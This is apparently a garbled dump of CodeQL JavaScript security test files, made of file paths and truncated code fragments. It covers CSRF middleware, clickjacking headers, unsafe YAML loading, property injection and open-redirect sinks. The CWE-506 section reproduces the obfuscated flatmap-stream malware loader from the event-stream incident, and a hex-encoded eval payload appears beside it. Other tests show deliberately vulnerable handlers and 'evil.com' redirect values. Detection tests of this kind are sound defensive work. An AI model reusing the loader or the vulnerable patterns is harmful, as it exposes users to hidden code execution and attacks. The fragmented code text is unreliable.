sport')require('passport')passpor ... true })passport.authorize{ session: true }session: trueapp.pos ... "];\n});app.pos ... l"];\n})/changeEmailfunctio ... il"];\n}{\n    l ... il"];\n}let new ... mail"];newEmai ... Email"]req.coo ... Email"](functi ... }));\n})functio ...  }));\n}{\n    v ...  }));\n}const e ...      };errorCa ...       }(fn) => ...       }fn(req, ...  + e));fn(req, ... " + e))fn(req, ... ).catchfn(req, res, next)(e) =>  ...  " + e)console ...  " + e)"Caught " + eCaught app.pos ...    }));app.pos ...     }))errorCa ... \n    })async f ... ;\n    }fn.call ...  + e));fn.call ... " + e))fn.call ... ).catchfn.call ... , next)fn.call/doLoginStuffreq.ses ... f(req);req.ses ... ff(req)req.session.userreq.sessionloginStuff(req)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-352/MissingCsrfMiddlewareGood.jscsrf'csurf'var exp ... press')var coo ... arser')var pas ... sport')var csr ... csurf')csrf =  ... csurf')require('csurf')csurfcsrf({  ... true }){ cookie:true }cookie:true/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-352/MissingCsrfMiddlewareGood2.js Assume token is being set somewhere// Assu ... mewhere There is nothing wrong with setting the token late, as long as it is checked early.// Ther ...  early.getCsrfToken'x-xsrf-token'setCsrfToken'XSRF-TOKEN'csrfTokengenerateToken'base64'_csrf'x-csrf-token'checkToken'HEAD''OPTIONS''thomasdavislovessalmon'xsrfToken"Halt and catch fire!"(functi ...  })\n});(functi ...   })\n}){\n\n     ...    })\n}return  ... oken'];request ... token']request.headersx-xsrf-tokenrespons ... ken());respons ... oken())response.cookieXSRF-TOKENrequest.csrfToken()request.csrfTokencsrf =  ... n\n    }getCsrf ... rfTokensetCsrf ... rfTokenapp.use ... en }));app.use ... ken }))express ... oken })express.csrf{ value ... Token }value:  ... rfTokencsrf.getCsrfTokenapp.use ... Token);app.use ... fToken)csrf.setCsrfTokenapp.pos ... \n    }){\n    v ...    })\n}var gen ... \n    };generat ... ;\n    }return  ... , len);crypto. ... 0, len)crypto. ...  .slicecrypto. ... ase64')crypto. ... oStringcrypto. ... 3 / 4))Math.ce ...  3 / 4)len * 3 / 4len * 3base64return  ... ken']);(req.bo ... oken'])(req.bo ... ._csrf)req.bod ... y._csrfreq.body._csrf(req.qu ... ._csrf)req.que ... y._csrfreq.query._csrf(req.he ... oken'])req.hea ... token']x-csrf-tokenvar che ... ;\n    }checkTo ... ;\n    }var tok ... n(24));token = ... en(24))req.ses ... en(24))req.session._csrf(req.se ... en(24))req.ses ... ken(24)generateToken(24)if ('GE ... next();'GET' = ... .method'GET' == req.methodreq.method'HEAD' == req.methodHEAD'OPTION ... .methodOPTIONSreturn next();var val ... e(req);val = d ... ue(req)defaultValue(req)if (val ...     });val != tokennext(fu ...      })res.sen ... lse });res.sen ... alse }){ auth: false }auth: falsecheck: checkTokenexpress ... arser()express.cookieParserapp.use ... n' }));app.use ... on' }))express ... mon' })express.session{ secre ... lmon' }secret: ... salmon''thomas ... salmon'thomasdavislovessalmonexpress.bodyParser()express.bodyParserapp.use(csrf.check);app.use(csrf.check)csrf.checkapp.use ...   }}));app.use ...    }}))express ...     }}){ value ... \n    }}value:  ... ;\n    }(functi ... ly.\n});(functi ... rly.\n})functio ... arly.\n}{\n    v ... arly.\n}if (req ...       }req.hea ... rfTokenreq.ses ... rfTokenthrow n ... fire!")new Err ... fire!")"Halt a ...  fire!"Halt and catch fire!req.ses ... oken();req.ses ... Token()req.csrfToken()req.csrfTokenapp.use(checkToken);app.use(checkToken)app.pos ...     });/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-352/csurf_api_example.js Adapted from https://github.com/expressjs/csurf, which is licensed under the MIT license; see file LICENSE.// lice ... ICENSE. create express app// crea ... ess app create api router// create api router mount api before csrf is appended to the app stack// moun ... p stack now add csrf and other middlewares, after the "/api" was mounted// now  ... mounted pass the csrfToken to the view// pass ... he view OK - cookies are not parsed// OK - ...  parsed NOT OK - may use cookies// NOT  ... cookiescreateApiRouter'/api''/form''/process''csrf was required to get here''/getProfile''no csrf to get here''/getProfile_unsafe'var bod ... arser')var api ... outer()api = c ... outer()createApiRouter()app.use('/api', api)/api{ cookie: true }cookie: trueapp.get ... ) })\n})/formfunctio ... () })\n}{\n  let ... () })\n}res.ren ... en() }){ csrfT ... ken() }csrfTok ... Token()app.pos ... re')\n})/processfunctio ... ere')\n}{ // OK ... ere')\n}res.sen ...  here')'csrf w ... t here'csrf was required to get herefunctio ... outer\n}{\n  var ... outer\n}var rou ... outer()new express.Router()router. ... ')\n  })/getProfilefunctio ... e')\n  }{ // OK ... e')\n  }'no csr ... t here'no csrf to get here/getProfile_unsafe{ // NO ... e')\n  }return router/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-352/csurf_example.js setup route middlewares// setu ... lewares parse cookies// parse cookies we need this because "cookie" is true in csrfProtection// we n ... tectioncsrfProtectionparseForm'data is being processed''/process_unsafe'var csr ... true })csrfPro ... true })var par ... alse })parseFo ... alse }){ // OK ... () })\n}app.pos ... ed')\n})functio ... sed')\n}{ // OK ... sed')\n}res.sen ... essed')'data i ... cessed'data is being processed/process_unsafe{ // NO ... sed')\n}/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-352/lusca_example.js NOT OK - missing csrf option// NOT  ...  optionlusca'lusca'var lus ... usca');lusca = ... lusca')require('lusca')lusca.csrf()lusca.csrflusca({csrf:true}){csrf:true}csrf:truelusca({csrf:{}}){csrf:{}}csrf:{}lusca()/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-352/unused_cookies.js NOT OK - uses cookies OK - doesn't actually use cookies// OK - ... cookies OK - attacker can't guess the captcha value either// OK - ...  either NOT OK - access to req.user is unprotected// NOT  ... otected NOT OK - access to req.session is unprotected'/doSomethingTerrible''secret'somethingTerrible'Ok''/doSomethingElse'somethingElse'/doWithCaptcha''captcha'"You guessed wrong, that 'u' was actually a 'U'. Try again."'/user''/session'let coo ... rser');app.pos ... ');\n});app.pos ... k');\n})'/doSom ... rrible'/doSomethingTerrible(req, r ... Ok');\n}{ // NO ... Ok');\n}if (req ... ;\n    }req.coo ... .secretreq.coo ... ecret']app.secretsomethingTerrible();somethingTerrible()res.end('Ok');res.end('Ok')Ok/doSomethingElse{ // OK ... Ok');\n}somethi ... ata']);somethi ... data'])req.query['data']/doWithCaptchareq.ses ... ptcha']captchareq.query['captcha']res.end ... ain.");res.end ... gain.")"You gu ... again."You guessed wrong, that 'u' was actually a 'U'. Try again.You guessed wrong, that 'u' was actually a 'U' Try again/usersomethi ... .name);somethi ... r.name)req.user.namereq.user/sessionsomethi ... n.name)req.session.nameapp.listen();app.listen()app.listen/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-400/DeepObjectResourceExhaustion/tst.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-400/DeepObjectResourceExhaustion/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-400allErrors'./input-schema''input'let ajv ... rue });ajv = n ... true })new Ajv ... true }){ allErrors: true }allErrors: trueajv.add ... nput');ajv.add ... input')require ... chema')./input-schema/input-schemaapp.get ... ;\n\t}\n})functio ... n;\n\t}\n}{\n\tif ( ... n;\n\t}\n}if (!aj ... urn;\n\t}{ // NO ... urn;\n\t}/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-400/RemovePropertyInjection/tst.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-400/RemovePropertyInjection NOT OK, but flagged by different query// NOT  ... t query OK - flagged by method name injection// OK - ... jectionmyObjmyCoolLocalFctuserControlledvar myObj = {}myObj = {}app.get ... ion\n});app.get ... tion\n})functio ... ction\n}{\n\tmyCo ... ction\n}myCoolL ... olled);myCoolL ... rolled)req.que ... trolledvar pro ... olled);prop =  ... rolled)myObj[prop] = 23;myObj[prop] = 23myObj[prop]myObj.prop = 23;myObj.prop = 23myObj.propvar x = myObj[prop];x = myObj[prop]x(23);x(23)delete myObj[prop];delete myObj[prop]Object. ... : 24});Object. ... e: 24}){value: 24}value: 24var headers = {};headers = {}headers[prop] = 42;headers[prop] = 42headers[prop]res.set(headers);res.set(headers)myCoolL ... y.x]();myCoolL ... ry.x]()myCoolL ... uery.x]req.query.xfunctio ... th);\n\n}{\n\tvar  ... th);\n\n}var result = x;result = xreturn  ... ength);result. ... length)result.substringresult.length/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-400/RemovePropertyInjection/tstNonExpr.jsuserValnewProp"$"var ser ... r");\n})server  ... r");\n})http.cr ... r");\n})functio ... ar");\n}{\n  var ... ar");\n}var use ... eq.url;userVal = req.urlvar new ... serVal;newProp ... userVal"$" + userValx[newProp] = 23;x[newProp] = 23x[newProp]res.write("foo");res.write("foo")res.end("bar");res.end("bar")/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-451/connect-bad.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-451'connect'var con ... nect');connect ... nnect')require('connect')var app = connect();app = connect()connect()app.use ... ){\n\n});app.use ... s){\n\n})functio ... es){\n\n}{\n\n}/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-451/connect-good.js'X-Frame-Options''DENY'app.use ... ');\n});app.use ... Y');\n})functio ... NY');\n}{\n    r ... NY');\n}res.set ... DENY');res.set ... 'DENY')X-Frame-OptionsDENY/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-451/express-bad.js'X-Frame-Options: 'app.get ... s'))\n})functio ... ns'))\n}{\n    r ... ns'))\n}res.sen ... ions'))'X-Fram ... tions')X-Frame-Options: res.get ... tions')res.get/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-451/express-good-array-routers.jsapp.get ...   }\n]);app.get ...    }\n])[\n    f ...     }\n]res.send("Hello");res.send("Hello")/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-451/express-good-library.jshelmet'helmet'frameguardvar exp ... lmet');helmet  ... elmet')require('helmet')app.use ... ard());app.use ... uard())helmet.frameguard()helmet.frameguardapp.get ... ) {\n});app.get ... s) {\n})functio ... es) {\n}/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-451/express-good-router-router.jsrouter1router2'/router1''/router2'router1 ... outer()router2 ... outer()app.use ... uter1);app.use ... outer1)/router1router1 ... uter2);router1 ... outer2)router1.use/router2router2 ... Y')\n});router2 ... NY')\n})router2.getfunctio ... ENY')\n}{\n    r ... ENY')\n}/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-451/express-good-router.jsrouter. ... Y')\n});router. ... NY')\n})router.getapp.use ... outer);app.use ... router)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-451/express-good-use.jsapp.use ... Y')\n});app.use ... NY')\n})/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-451/express-good.jsapp.get ... NY')\n})/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-451/express-good_hard.jsapp.get ... s);\n});app.get ... es);\n})functio ... res);\n}{\n    f(res);\n}f(res);f(res)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-451/hapi-bad.jsvar Hap ... hapi');var ser ... rver();server. ...    }});server. ...     }}){\n    h ... \n    }}handler ... \n\n    }{\n\n    }/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-451/hapi-good.jshandler ... )\n    }request ... 'DENY')request ... .headerrequest.response/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-451/koa-bad.jsKoa'koa'var Koa ... 'koa');Koa = require('koa')require('koa')koavar app = new Koa();app = new Koa()new Koa()app.use ... x){\n\n})functio ... tx){\n\n}/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-451/koa-good.js{\n    c ... ENY')\n}ctx.set ... 'DENY')ctx.set/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-451/node-bad.js9615http.cr ... n(9615)http.cr ...  {\n  })functio ... ) {\n  }{\n  }/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-451/node-good-fundecl.js{\n    r ... ');\n  }respons ... DENY');respons ... 'DENY')response.setHeaderhttp.cr ... eaders)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-451/node-good-late-registration.js"request"http.createServer()server. ... ');\n});server. ... Y');\n})server.listen(9615)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-451/node-good.jshttp.cr ... );\n  })/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-451/node-good_hard.jshttp.cr ... (9615);http.cr ... se);\n})functio ... nse);\n}{\n    f(response);\n}f(response);f(response)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-451/restify-bad.jsrestify'restify'var res ... tify');restify ... stify')require('restify')restify ... erver()restify.createServerserver. ... ){\n\n});server. ... e){\n\n})server.headfunctio ... se){\n\n}/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-451/restify-good.jsserver. ... Y')\n});server. ... NY')\n})response.header/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-502/tst.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-502jsyaml"js-yaml"'/store/:id'loadAllsafeLoadsafeLoadAllunsafeConfigDEFAULT_FULL_SCHEMAconst j ... yaml");jsyaml  ... -yaml")require("js-yaml")js-yaml/store/:idlet data;data =  ... .data);data =  ... s.data)jsyaml. ... s.data)jsyaml.loadreq.params.datajsyaml.loadAlljsyaml.safeLoadjsyaml.safeLoadAlllet uns ... HEMA };unsafeC ... CHEMA }{ schem ... CHEMA }schema: ... _SCHEMAjsyaml. ... _SCHEMAdata =  ... onfig);data =  ... Config)jsyaml. ... Config)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-506/event-stream-orig.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-506 from https://unpkg.com/flatmap-stream@0.1.1/index.min.js// from ... .min.jsfailures"failure""drain""end""flatmap stream is not writable""close""hex""2e2f746573742f64617461"var Str ... Stream;Stream= ... .Streamrequire ... .Streammodule. ... !1},i};module. ... =!1},i}functio ... =!1},i}{var i= ... =!1},i}var i=n ... ",m={};i=new Streamnew Streama=0o=0u=!1!1f=!1l=!1c=0s=!1d=(n=n| ... "error"(n=n||{ ... "error"(n=n||{}).failures(n=n||{})n=n||{}n||{}failurem={}functio ... &&v())}{var t= ... &&v())}var t=c+1;t=c+1c+1if(e=== ... w(n,t)}e===t?( ... erty(t)e===t?( ... :m[e]=re===t(void 0 ... ++,t++)void 0! ... c++,t++void 0! ... ta",r])void 0!==rvoid 0i.emit. ... ta",r])i.emit.applyi.emit["data",r]c++t++m[e]=rm[e]m.hasOwnProperty(t)m.hasOwnProperty{var n= ... w(n,t)}var n=m[t];n=m[t]m[t]return  ... ,w(n,t)delete m[t],w(n,t)delete m[t]w(n,t)a===++o ... u&&v())a===++o++o(f&&(f= ... u&&v())f&&(f=! ... ,u&&v()f&&(f=! ... rain"))(f=!1,i ... rain"))f=!1,i.emit("drain")i.emit("drain")drainu&&v()v()functio ... ,s=!1)}{l||(s= ... ,s=!1)}l||(s=! ... ),s=!1)(s=!0,r ... ),s=!1)s=!0,r& ... ]),s=!1s=!0!0r&&!n.f ... |w(e,t)r&&!n.failures!n.failuresn.failuresw(e,t)r&&i.em ... ,[d,r])i.emit. ... ,[d,r])[d,r]functio ... e,t)})}{return ... e,t)})}return  ... ,e,t)})e.call( ... ,e,t)})e.callfunctio ... r,e,t)}{n(r,e,t)}n(r,e,t)functio ... roy())}{if(u=! ... roy())}if(u=!0 ... w(r,a);u=!0,i. ... d 0!==ru=!0i.writable=!1i.writablereturn w(r,a);w(r,a)a==o&&( ... troy())a==o(i.read ... troy())i.reada ... stroy()i.readable=!1i.readablei.emit("end")i.destroy()i.destroyreturn  ... f=!1},ii.writa ... f=!1},ii.writable=!0i.readable=!0i.write ... r),!f}}i.writefunctio ... r),!f}}{if(u)t ... r),!f}}if(u)th ... able");throw n ... able");new Err ... table")"flatma ... itable"flatmap stream is not writables=!1;try{for ... (r),!f}{for(va ... turn!f}for(var ... )break}var e{a++;va ... )break}a++;a++var t=b(r[e],a,p);t=b(r[e],a,p)b(r[e],a,p)r[e]if(f=!1===t)breakf=!1===t!1===treturn!f!fcatch(r ... (r),!f}{if(s)t ... (r),!f}if(s)throw r;throw r;return p(r),!fp(r),!fp(r)i.end=f ... ||v(r)}i.endfunction(r){u||v(r)}{u||v(r)}u||v(r)v(r)i.destr ... se")})}functio ... se")})}{u=l=!0 ... se")})}u=l=!0, ... ose")})u=l=!0l=!0i.writa ... le=f=!1i.readable=f=!1process ... ose")})functio ... lose")}{i.emit("close")}i.emit("close")i.pause ... ){f=!0}i.pausefunction(){f=!0}{f=!0}f=!0i.resum ... ){f=!1}i.resumefunction(){f=!1}{f=!1}!functi ... ){}}();!functi ... r){}}()functio ... r){}}()functio ... h(r){}}{try{va ... h(r){}}try{var ... ch(r){}{var r= ... (n[1])}var r=r ... rocess;r=requiret=processfunctio ... ring()}{return ... ring()}return  ... tring()Buffer. ... tring()Buffer. ... oStringBuffer.from(r,"hex")var n=r ... n[4])];n=r(e(" ... 7461"))r(e("2e ... 7461"))e("2e2f ... 17461")"2e2f74 ... 617461"2e2f746573742f64617461o=t[e(n ... (n[4])]t[e(n[3])][e(n[4])]t[e(n[3])]e(n[3])n[3]e(n[4])n[4]if(!o)return;!ovar u=r ... n[9]));u=r(e(n ... [5]),o)r(e(n[2 ... [5]),o)r(e(n[2]))[e(n[6])]r(e(n[2]))e(n[2])n[2]e(n[6])n[6]e(n[5])n[5]a=u.upd ... (n[9]))u.updat ... (n[9]))u.updaten[0]e(n[8])n[8]e(n[9])n[9]a+=u.final(e(n[9]));a+=u.final(e(n[9]))u.final(e(n[9]))u.finalvar f=n ... ructor;f=new m ... tructorf.paths ... s(n[1])f.paths=module.pathsf.pathsmodule.pathsf[e(n[7])](a,"")f[e(n[7])]e(n[7])n[7]f.exports(n[1])f.exportsn[1]catch(r){}/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-506/event-stream.js Based on https://github.com/dominictarr/event-stream/issues/116// Base ... ues/116var r = ... rocess;r = requiret = processfunctio ... ing()\n}{\n  ret ... ing()\n}Buffer. ...  "hex")var n = ... n[4])];n = r(e ... 7461"))o = t[e ... (n[4])]if (!o) return;var u = ... ]), o);u = r(e ... 5]), o)r(e(n[2 ... 5]), o)a += u. ... n[9]));a += u. ... (n[9]))var f = ... ructor;f = new ... tructorf.paths ... .paths;f.paths ... e.pathsf[e(n[7])](a, "");f[e(n[7])](a, "")f.exports(n[1]);/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-506/tst.js NOT OK: eval("console.log('code injection')")// NOT  ... ion')") OK: throws parse error// OK:  ... e error OK, but currently flagged [INCONSISTENCY]totallyHarmlessString'636f6e736f6c652e6c6f672827636f646520696e6a656374696f6e2729'"0123456789""n""Bigints supported.""Bigints not supported."'babeface'var tot ... e2729';totally ... 6e2729'totally ... sString'636f6e ... 6e2729'636f6e736f6c652e6c6f672827636f646520696e6a656374696f6e2729eval(Bu ... ing());eval(Bu ... ring())Buffer. ...  'hex')eval(to ... tring);eval(to ... String)var tes ... 56789";test = "0123456789"0123456789try {\n  ... d.");\n}{\n  eva ... d.");\n}eval(test+"n");eval(test+"n")test+"n"console ... ted.");console ... rted.")Bigints supported.Bigints supportedcatch(e ... d.");\n}{\n  con ... d.");\n}"Bigint ... orted."Bigints not supported.Bigints not supportedrequire('babeface');require('babeface')babeface/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-601/ClientSideUrlRedirect/electron.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-601/ClientSideUrlRedirect/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-601'electron'openExternalimport  ... ctron';shell.o ... int());shell.o ... aint())shell.openExternal/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-601/ClientSideUrlRedirect/externs.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-601/ClientSideUrlRedirect/react.jsMy unsafe appLink'next/link'NextLinkthis page!useRouter'next/router'nextRouterClick to XSS 1withRouterPageClick to XSS 2pageWithRouterplainLinkmy plain link!someUnknownFOOis safe.<script ... hash}/>src={do ... n.hash}import  ... t/link'next/linkexport  ... ink>;\n}functio ... ink>;\n}{\n    r ... ink>;\n}return  ... /Link>;<Link h ... </Link>href={d ... n.hash}<a>this page!</a>import  ... router'next/routerexport  ... span>\n}{\n  con ... span>\n}const r ... uter();router = useRouter()useRouter()<span o ... </span>onClick ... tr(1))}() => r ... str(1))router. ... str(1))router.push{ router }{\n  ret ... span>\n}export  ... (Page);const p ... (Page);pageWit ... r(Page)withRouter(Page)export  ... </a>;\n}functio ... </a>;\n}{\n  ret ... </a>;\n}return  ... k!</a>;<a href ... nk!</a>href={d ... str(1)}export  ... FOO>;\n}functio ... FOO>;\n}{\n  ret ... FOO>;\n}return  ... </FOO>;<FOO da ... .</FOO>data={d ... str(1)}/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-601/ClientSideUrlRedirect/sanitizer.js NOT OK - can be example.com.evil.com// NOT  ... vil.com NOT OK - does not restrict hostname// NOT  ... ostname NOT OK - can be //evil.com NOT OK - can be //example.com.evil.com NOT OK - could be evil.com?x=https://example.com/// NOT  ... le.com/ OK - the whole prefix is not known, but enough to restrict hostname// OK - ... ostname'https://example.com''https://example.com/''https://example.com//''https://example.com/foo''https://''https:/''https:''//''//example.com''//example.com/'let url ... w.name;url = window.nameif (url ... m\n    }url.sta ... e.com')url.startsWith'https: ... le.com'https://example.com{\n      ... m\n    }window. ...  = url;window. ... n = urlif (url ... K\n    }url.sta ... .com/')'https: ... e.com/'https://example.com/url.sta ... com//')'https: ... .com//'https://example.com//com//if (url ...  \n    }url.sta ... m/foo')'https: ... om/foo'https://example.com/foocom/fooif (url ... e\n    }url.sta ... ps://')url.sta ... tps:/')https:/url.sta ... ttps:')url.startsWith('/')url.startsWith('//')//example.com//example//example.com/if (url ... /\n    }url.end ... .com/')url.endsWith{\n      ... /\n    }let bas ...  'bar';basedir ... : 'bar'whateve ... : 'bar'whatever()url.sta ... asedir)'https: ... basedir/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-601/ClientSideUrlRedirect/tsconfig.json/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-601/ClientSideUrlRedirect/tst.js/.*redirect=([^&]*).*/'.*redirect=([^&]*).*'winwindow. ... ef)[1];window. ... ref)[1]/.*redi ... ref)[1]/.*redi ... n.href)/.*redi ... */.exec/.*redi ... &]*).*/.*redirect=([^&]*).*redirect=(functi ... 1];\n});(functi ... [1];\n})functio ... )[1];\n}{\n\tvar  ... )[1];\n}var ind ... ]*).*/;indirec ... &]*).*/indirec ... ref)[1]indirec ... n.href)indirect.execnew Reg ... ref)[1]new Reg ... n.href)new Reg ... ').execnew Reg ... ]*).*')'.*redi ... &]*).*'var ind ... ]*).*')indirec ... ]*).*')new Reg ... /).execnew Reg ... ]*).*/)var ind ... ]*).*/)indirec ... ]*).*/){\n\twin. ... OT OK\n}win.loc ... f)[1]);win.loc ... ef)[1])win.location.assignwin.locationwin.location.hreffoo(window);foo(window)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-601/ClientSideUrlRedirect/tst10.js OK - cannot affect hostname'//foo''https://foo'locatio ... search;locatio ... .search'/foo'  ... .search'/' + d ... .search'//' +  ... .search'//foo' ... .search//foo'https: ... .searchhttps://foo/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-601/ClientSideUrlRedirect/tst11.js Also OK.// Also OK.urlPartsboxes"#mappage"functio ... ge");\n}{\n    v ... ge");\n}var url ... t('?');urlPart ... it('?')documen ... it('?')var loc ... .value;loc = u ... s.valueurlPart ... s.valueurlParts[0] + "?"urlParts[0]boxes.valuewindow. ... n = locwindow. ... page");window. ... ppage")window. ... appage"window. ... "#")[0]window. ... it("#")window. ... f.split#mappage/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-601/ClientSideUrlRedirect/tst12.jsfunctio ... = loc\n}{\n    v ... = loc\n}window. ... it('?')/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-601/ClientSideUrlRedirect/tst13.js"a"formaction"embed""form""frame""iframe""isindex""script"'history'createBrowserHistoryquzHistoryLibraryvar el  ... t("a");el = do ... nt("a")documen ... nt("a")el.href = payload;el.href = payloadel.hrefdocumen ... ld(el);documen ... ild(el)var el  ... tton");el = do ... utton")documen ... utton")el.form ... ayload;el.form ... payloadel.formactionvar el  ... mbed");el = do ... embed")documen ... embed")el.src = payload;el.src = payloadel.srcvar el  ... form");el = do ... "form")documen ... "form")el.action = payload;el.action = payloadel.actionvar el  ... rame");el = do ... frame")documen ... frame")var el  ... nput");el = do ... input")documen ... input")var el  ... ndex");el = do ... index")documen ... index")isindexvar el  ... ject");el = do ... bject")documen ... bject")el.data = payload;el.data = payloadel.datavar el  ... ript");el = do ... cript")documen ... cript")(functi ...  }\n})()(functi ...    }\n}){\n    s ...     }\n}self.on ... K\n    }self.onmessageimportScripts(e);importScripts(e)window. ... K\n    }window.onmessageself.im ... pts(e);self.im ... ipts(e)self.importScriptsconst h ... tory();history ... story()require ... story()require ... Historyrequire('history')history ... yload);history ... ayload)history.pushhistory ... bstr(1)history ... .substrhistory ... on.hashhistory.locationhistory.replaceHistory ... story()History ... History/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-601/ClientSideUrlRedirect/tst14.js"https://github.com/"'https://github.com/'var url ... str(1);url = d ... bstr(1)el.src  ...  + url;el.src  ... " + url"https: ... " + url"https: ... b.com/"https://github.com/'https: ... b.com/'/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-601/ClientSideUrlRedirect/tst2.jsfunctio ... )+1);\n}{\n  var ... )+1);\n}var hre ... n.href;href =  ... on.hrefwindow. ... ?')+1);window. ... '?')+1)href.su ... '?')+1)href.substringhref.indexOf('?')+1href.indexOf('?')/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-601/ClientSideUrlRedirect/tst3.jsfunctio ... /'));\n}{\n  var ... /'));\n}window. ... ('/'));window. ... f('/'))href.su ... f('/'))href.la ... Of('/')href.lastIndexOf/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-601/ClientSideUrlRedirect/tst4.js"https://lgtm.com?""https: ... '?')+1)https://lgtm.com?com?/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-601/ClientSideUrlRedirect/tst5.jswindow. ... .value;window. ... s.valuewindow. ... ] + '?'window. ... '?')[0]window. ... ).split/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-601/ClientSideUrlRedirect/tst6.js$location'redirect'angular ... o";\n});angular ... oo";\n})angular ... ('app')functio ... foo";\n}{\n  let ... foo";\n}let red ... rect');redirec ... irect')$locati ... irect')$location.searchwindow. ... direct;window. ... edirect$locati ... irect);$locati ... direct)$location.urlwindow. ...  "foo";window. ... + "foo"$locati ... + "foo"/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-601/ClientSideUrlRedirect/tst7.js"<script>"new Wor ... earch);new Wor ... search)$("<scr ... earch);$("<scr ... search)$("<script>").attr$("<script>")<script>/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-601/ClientSideUrlRedirect/tst8.js"https://lgtm.com"questionMark{\n  var ... arch;\n}var sea ... str(1);search  ... bstr(1)window. ... search;window. ...  search"https: ...  search"https: ... nMark()questionMark()functio ...  "?";\n}{\n  return "?";\n}return 